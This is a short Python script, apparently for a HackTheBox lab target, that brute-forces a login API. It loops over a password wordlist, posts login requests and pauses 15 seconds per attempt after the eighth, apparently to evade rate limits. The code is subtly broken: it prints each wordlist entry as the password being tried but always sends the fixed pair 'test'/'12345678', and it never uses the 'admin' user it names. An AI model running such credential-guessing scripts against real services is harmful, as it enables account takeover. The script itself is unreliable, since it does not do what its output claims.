import requests
import time
url = 'http://data.analytical.htb:80/api/session'


user = "admin"
with open('password_wordlists.txt', 'r') as file:
    c = 0
    for line in file:
        print("Trying for user " + user + " password " + line)
        myobj = {'username': 'test', 'password': '12345678', 'remember':True}

        x = requests.post(url, json = myobj)
        print(x.status_code)
        print(x.text)

        c += 1
        if c >= 8:
            time.sleep(15)
